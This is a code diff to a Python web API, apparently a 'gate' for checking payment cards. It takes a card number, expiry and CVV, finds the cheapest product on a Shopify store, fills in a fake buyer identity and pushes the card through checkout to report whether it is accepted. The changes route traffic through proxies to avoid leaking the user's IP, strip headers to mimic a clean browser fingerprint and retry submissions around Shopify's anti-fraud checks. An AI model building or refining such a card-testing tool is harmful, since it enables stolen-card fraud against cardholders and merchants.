@@ -21,7 +21,7 @@ def format_proxy(proxy_str):
     elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
     return f"http://{proxy_str}"
 
-def safe_response(msg, raw_data, price, gate="Python Dynamic V27 (Hunter)"):
+def safe_response(msg, raw_data, price, gate="Python Dynamic V28 (Ghost Proxy)"):
     raw_clean = str(raw_data).replace('\n', ' ').replace('\r', '').replace('  ', '')[:400] if raw_data else "No Raw Data"
     final_msg = f"{msg} | RAW: {raw_clean}" if ("Failed" in msg or "Error" in msg or "Declined" in msg or "Rejected" in msg or "Empty" in msg or "Blocked" in msg) else msg
     clean_price = str(price).replace('$', '').strip() if price else "-"
@@ -42,29 +42,16 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
         proxy_url = format_proxy(proxy)
         proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
 
-        # 🔥 تعديل العنوان لولاية Delaware (DE) زيرو ضرائب لتقليل السعر
         buyer = {
             "email": f"j.doe{random.randint(10000,99999)}@gmail.com", "first_name": "James", "last_name": "Smith",
             "address1": "8 The Green", "city": "Dover", "province": "DE", "zip": "19901", "country": "US", "phone": "3025551234"
         }
 
-        with requests.Session(impersonate="chrome120") as session:
+        # 🔥 التحديث الجذري: حقن البروكسي مباشرة في الـ Session لمنع تسريب الـ IP
+        with requests.Session(impersonate="chrome120", proxies=proxies) as session:
             session.verify = False
-            if proxies: session.proxies.update(proxies)
             
-            session.headers.update({
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                'Accept-Language': 'en-US,en;q=0.9',
-                'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-                'Sec-Ch-Ua-Mobile': '?0',
-                'Sec-Ch-Ua-Platform': '"Windows"',
-                'Sec-Fetch-Dest': 'document',
-                'Sec-Fetch-Mode': 'navigate',
-                'Sec-Fetch-Site': 'none',
-                'Sec-Fetch-User': '?1',
-                'Upgrade-Insecure-Requests': '1'
-            })
+            # تم حذف الهيدرز اليدوية بالكامل لترك بصمة المتصفح نقية بدون تشويه
 
             variant_id, price = None, "-"
             ep = f"{store_url}/products.json?limit=250"
@@ -74,7 +61,6 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                     data = r1.json()
                     prods = data.get('products', []) if isinstance(data, dict) else (data if isinstance(data, list) else [])
                     
-                    # 🔥 خوارزمية صيد أرخص منتج في المتجر
                     lowest_price = float('inf')
                     for p in prods:
                         for v in p.get('variants', []):
@@ -94,28 +80,11 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             if not variant_id: 
                 return JSONResponse(content=safe_response("Product Not Found", "No variants available", "-"))
 
-            session.headers.update({
-                "X-Requested-With": "XMLHttpRequest", 
-                "Accept": "application/json",
-                "Sec-Fetch-Dest": "empty",
-                "Sec-Fetch-Mode": "cors",
-                "Sec-Fetch-Site": "same-origin"
-            })
-            add_res = session.post(f"{store_url}/cart/add.js", json={"id": variant_id, "quantity": 1})
+            add_res = session.post(f"{store_url}/cart/add.js", json={"id": variant_id, "quantity": 1}, headers={"X-Requested-With": "XMLHttpRequest", "Accept": "application/json"})
             if add_res.status_code not in [200, 201]: 
                 return JSONResponse(content=safe_response("Cart Add Blocked", f"HTTP {add_res.status_code}", price))
 
             time.sleep(1.5)
-
-            session.headers.pop("X-Requested-With", None)
-            session.headers.update({
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                'Sec-Fetch-Dest': 'document',
-                'Sec-Fetch-Mode': 'navigate',
-                'Sec-Fetch-Site': 'same-origin',
-                'Sec-Fetch-User': '?1'
-            })
             
             res_chk = session.post(f"{store_url}/cart", data={"checkout": "Checkout"}, allow_redirects=True)
             html_chk = res_chk.text
@@ -145,11 +114,9 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
 
             pci_headers = {
                 "Origin": "https://checkout.pci.shopifyinc.com", 
+                "Referer": "https://checkout.pci.shopifyinc.com/",
                 "Content-Type": "application/json", 
-                "Accept": "application/json",
-                "Sec-Fetch-Dest": "empty",
-                "Sec-Fetch-Mode": "cors",
-                "Sec-Fetch-Site": "cross-site"
+                "Accept": "application/json"
             }
             res_pci = session.post("https://checkout.pci.shopifyinc.com/sessions", json={"credit_card": {"number": cc_num, "month": int(mm), "year": int(yy), "verification_value": cvv, "name": buyer['first_name']}, "payment_session_scope": scope_host}, headers=pci_headers)
             if res_pci.status_code != 200: res_pci = session.post("https://deposit.us.shopifycs.com/sessions", json={"credit_card": {"number": cc_num, "month": mm, "year": yy, "verification_value": cvv, "name": buyer['first_name']}, "payment_session_scope": scope_host}, headers=pci_headers)
@@ -166,11 +133,13 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
 
             gql_url = f"{store_url}/checkouts/unstable/graphql?operationName=Proposal"
             gql_headers = {
-                'shopify-checkout-client': 'checkout-web/1.0', 'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
-                'x-checkout-web-source-id': checkout_token, 'x-checkout-one-session-token': session_token, 'Content-Type': 'application/json',
-                "Sec-Fetch-Dest": "empty",
-                "Sec-Fetch-Mode": "cors",
-                "Sec-Fetch-Site": "same-origin"
+                'shopify-checkout-client': 'checkout-web/1.0', 
+                'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
+                'x-checkout-web-source-id': checkout_token, 
+                'x-checkout-one-session-token': session_token, 
+                'Content-Type': 'application/json',
+                'Origin': store_url,
+                'Referer': final_url
             }
             merch_id = str(uuid.uuid4())
             
@@ -224,7 +193,6 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                 "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"], "emailChanged": False, "phoneCountryCode": "US", "marketingConsent": [], "shopPayOptInPhone": None, "rememberMe": False}
             }
             
-            # 🔥 الضربة الأولى
             res_prop = session.post(gql_url, json={"operationName": "Proposal", "query": prop_query, "variables": prop_vars}, headers=gql_headers)
             res_prop_json = res_prop.json()
             
@@ -236,7 +204,6 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             
             time.sleep(4.5)
             
-            # 🔥 الضربة الثانية
             res_prop2 = session.post(gql_url, json={"operationName": "Proposal", "query": prop_query, "variables": prop_vars}, headers=gql_headers)
             res_prop_json2 = res_prop2.json()
             negotiate_res = res_prop_json2.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
@@ -348,21 +315,37 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                 }
             }
             
-            res_sub = session.post(sub_url, json={"operationName": "SubmitForCompletion", "query": sub_query, "variables": sub_vars}, headers=gql_headers)
-            sub_data = res_sub.json().get('data', {}).get('submitForCompletion', {})
+            # 🔥 اللوب الذكي (Adaptive Polling)
+            max_retries = 4
+            sub_typename = None
+            sub_data = {}
+            res_sub_text = ""
             
-            sub_typename = sub_data.get('__typename') if sub_data else None
+            for attempt in range(max_retries):
+                res_sub = session.post(sub_url, json={"operationName": "SubmitForCompletion", "query": sub_query, "variables": sub_vars}, headers=gql_headers)
+                res_sub_text = res_sub.text
+                sub_data = res_sub.json().get('data', {}).get('submitForCompletion', {})
+                sub_typename = sub_data.get('__typename') if sub_data else None
+                
+                if sub_typename == 'SubmitRejected':
+                    errs = sub_data.get('errors', [])
+                    if errs:
+                        err_code = errs[0].get('code', '')
+                        if err_code == 'WAITING_PENDING_TERMS':
+                            time.sleep(3.5)
+                            continue
+                break
 
             if sub_typename == 'SubmitRejected':
                 errs = sub_data.get('errors', [])
                 if errs:
                     err_code = errs[0].get('code', '')
                     if err_code == 'ARTIFACT_DISSATISFACTION':
-                        return JSONResponse(content=safe_response("Declined: Anti-Fraud Risk Block 🛡️", res_sub.text[:400], price))
+                        return JSONResponse(content=safe_response("Declined: Anti-Fraud Risk Block 🛡️", res_sub_text[:400], price))
                     msg = errs[0].get('localizedMessage', 'Rejected')
                 else:
                     msg = 'Rejected'
-                return JSONResponse(content=safe_response(f"Shopify System Rejected: {msg}", res_sub.text[:400], price))
+                return JSONResponse(content=safe_response(f"Shopify System Rejected: {msg}", res_sub_text[:400], price))
             
             if sub_typename == 'SubmitFailed':
                 return JSONResponse(content=safe_response("Declined: Silent Gateway Rejection 💳", "SubmitFailed (No Receipt)", price))
@@ -372,15 +355,15 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                 if not receipt_id:
                     err = sub_data.get('receipt', {}).get('processingError', {}).get('code')
                     if err:
-                        return JSONResponse(content=safe_response(f"Declined: {err}", res_sub.text[:400], price))
+                        return JSONResponse(content=safe_response(f"Declined: {err}", res_sub_text[:400], price))
                     return JSONResponse(content=safe_response("Order processing 💎", "No Receipt ID", price))
             elif not sub_typename:
                 if not sub_data:
-                    return JSONResponse(content=safe_response("Empty Submit Response (Check status)", res_sub.text[:400], price))
+                    return JSONResponse(content=safe_response("Empty Submit Response (Check status)", res_sub_text[:400], price))
             
             receipt_id = sub_data.get('receipt', {}).get('id')
             if not receipt_id: 
-                return JSONResponse(content=safe_response("Submit Failed", res_sub.text[:400], price))
+                return JSONResponse(content=safe_response("Submit Failed", res_sub_text[:400], price))
 
             poll_url = f"{store_url}/checkouts/unstable/graphql?operationName=PollForReceipt"
             poll_query = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id}...on FailedReceipt{processingError{...on PaymentFailed{code messageUntranslated}...on OrderCreationFailure{paymentsHaveBeenReverted}}}}}"""
